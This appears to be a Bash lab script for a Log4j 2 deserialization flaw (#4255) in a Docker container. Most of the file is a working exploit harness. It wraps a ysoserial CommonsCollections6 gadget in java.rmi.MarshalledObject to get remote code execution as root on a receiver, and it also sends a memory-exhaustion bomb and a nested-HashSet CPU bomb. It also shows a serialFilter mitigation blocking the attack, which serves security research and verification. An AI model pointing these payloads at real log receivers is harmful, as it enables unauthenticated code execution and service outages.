#!/usr/bin/env bash
# =============================================================================
# log4j2 #4255 — self-contained local lab
#   FilteredObjectInputStream allowlist bypass via java.rmi.MarshalledObject
#
# Everything runs in a disposable Docker container built from ./Dockerfile.
# The only outbound traffic is to Maven Central (official Log4j jars, at build).
# Host needs just: docker + python3.  For authorized local research only.
#
#   ./run.sh up            start a VULNERABLE receiver (Log4j 2.26.1 + commons-collections 3.2.1)
#   ./run.sh pwn           fire ONE unauthenticated packet -> RCE (root-owned marker appears)
#   ./run.sh safe          restart the receiver WITH the mitigation, show RCE blocked
#   ./run.sh oom           fire the Object[] 2^31-1 bomb -> OutOfMemoryError in the receiver
#   ./run.sh dos           fire the nested-HashSet CPU bomb -> receiver thread pins a core
#   ./run.sh demo          up -> pwn -> safe -> pwn -> oom   (the whole story)
#   ./run.sh logs          tail the receiver log
#   ./run.sh clean         remove the lab container
#
# RCE needs a ysoserial jar you supply:  YSOSERIAL=/path/to/ysoserial.jar ./run.sh pwn
#   (https://github.com/frohoff/ysoserial — large/third-party, intentionally not bundled)
# =============================================================================
set -eu
HERE="$(cd "$(dirname "$0")" && pwd)"
IMG=log4j4255
CTR=log4j4255-recv
PORT="${PORT:-4560}"
MARK=/tmp/PWNED_4255
TEMURIN=eclipse-temurin:17-jdk
G=$'\e[32m'; R=$'\e[31m'; A=$'\e[33m'; D=$'\e[2m'; O=$'\e[0m'
die(){ echo "${R}[!] $*${O}"; exit 1; }
need(){ command -v "$1" >/dev/null 2>&1 || die "missing dependency: $1"; }
need docker; need python3

build(){ docker image inspect "$IMG" >/dev/null 2>&1 || { echo "${A}[*] building image (fetches official jars from Maven Central)...${O}"; docker build -t "$IMG" "$HERE"; }; }

start(){ # $1 = extra "-e MITIGATE=1" or empty
  build
  docker rm -f "$CTR" >/dev/null 2>&1 || true
  docker run -d --rm --name "$CTR" -p "$PORT:$PORT" -e "PORT=$PORT" $1 "$IMG" >/dev/null
  sleep 2; docker logs "$CTR" 2>&1 | tail -1
}
up(){   echo "${A}[*] VULNERABLE receiver on :$PORT${O}"; start ""; }
safe(){ echo "${A}[*] receiver WITH mitigation -Djdk.serialFilter='!java.rmi.MarshalledObject'${O}"; start "-e MITIGATE=1"; }

alive(){ docker inspect -f '{{.State.Running}}' "$CTR" 2>/dev/null | grep -q true || die "receiver not running — ./run.sh up first"; }

pwn(){
  alive
  local yso="${YSOSERIAL:-}"
  [ -n "$yso" ] && [ -f "$yso" ] || die "RCE needs ysoserial: YSOSERIAL=/path/to/ysoserial.jar ./run.sh pwn"
  docker exec "$CTR" rm -f "$MARK" 2>/dev/null || true
  echo "${D}[*] before:  $(docker exec "$CTR" ls -l "$MARK" 2>&1)${O}"
  echo "${A}[*] firing CommonsCollections6 gadget wrapped in MarshalledObject -> touch $MARK${O}"
  # ysoserial (in Docker, jar mounted) -> raw gadget -> wrap in #4255 envelope -> send
  docker run --rm -v "$yso":/yso.jar:ro "$TEMURIN" java \
    --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED \
    --add-opens java.base/java.lang.reflect=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED \
    -jar /yso.jar CommonsCollections6 "touch $MARK" \
    | python3 "$HERE/payload.py" wrap --gadget - -t 127.0.0.1 -p "$PORT"
  sleep 2
  if docker exec "$CTR" ls -l "$MARK" >/dev/null 2>&1; then
    echo "${G}[+] RCE CONFIRMED — $(docker exec "$CTR" ls -l "$MARK") (ran as: $(docker exec "$CTR" stat -c '%U' "$MARK"))${O}"
  else
    echo "${R}[-] no marker — receiver rejected it (mitigation on?) or no usable gadget${O}"
  fi
  echo "${D}[*] receiver log: $(docker logs "$CTR" 2>&1 | tail -1)${O}"
}

oom(){
  alive
  echo "${A}[*] firing Object[] 2^31-1 bomb (~44 bytes) -> OOM in the receiver${O}"
  python3 "$HERE/payload.py" oom -t 127.0.0.1 -p "$PORT"
  sleep 2
  echo "${D}[*] receiver log: $(docker logs "$CTR" 2>&1 | tail -1)${O}"
}

dos(){
  alive
  local depth="${1:-100}"
  echo "${A}[*] building nested-HashSet CPU bomb (depth=$depth) and firing${O}"
  docker run --rm -v "$HERE":/w:ro -w /tmp "$TEMURIN" sh -c \
    "cp /w/PayloadGen.java . && javac PayloadGen.java 2>/dev/null && java PayloadGen $depth" \
    | python3 "$HERE/payload.py" wrap --gadget - -t 127.0.0.1 -p "$PORT"
  echo "${A}[*] receiver thread is now pinning a core on ~2^$depth hashCode() calls.${O}"
  echo "${D}    docker stats --no-stream $CTR   # watch CPU near 100%${O}"
  echo "${D}    ./run.sh clean                  # kill it (no natural recovery)${O}"
}

clean(){ docker rm -f "$CTR" >/dev/null 2>&1 || true; echo "[*] cleaned lab container"; }

demo(){
  clean; up; echo
  echo "${G}=== 1) VULNERABLE — one packet, code runs as root ===${O}"; pwn; echo
  safe; echo
  echo "${G}=== 2) MITIGATED — same packet, blocked ===${O}"; pwn; echo
  up; echo   # back to vulnerable for the DoS demo
  echo "${G}=== 3) OOM DoS — 44-byte packet, receiver dies ===${O}"; oom; echo
  echo "${D}[*] CPU-DoS is separate (it wedges the receiver): ./run.sh up && ./run.sh dos${O}"
  echo "${D}[*] done. './run.sh clean' to tear down.${O}"
}

case "${1:-}" in
  up) up ;;
  pwn) pwn ;;
  safe) safe ;;
  oom) oom ;;
  dos) dos "${2:-100}" ;;
  demo|all) demo ;;
  logs) docker logs -f "$CTR" ;;
  clean) clean ;;
  build) build ;;
  *) sed -n '2,25p' "$0" | sed 's/^# \{0,1\}//' ;;
esac
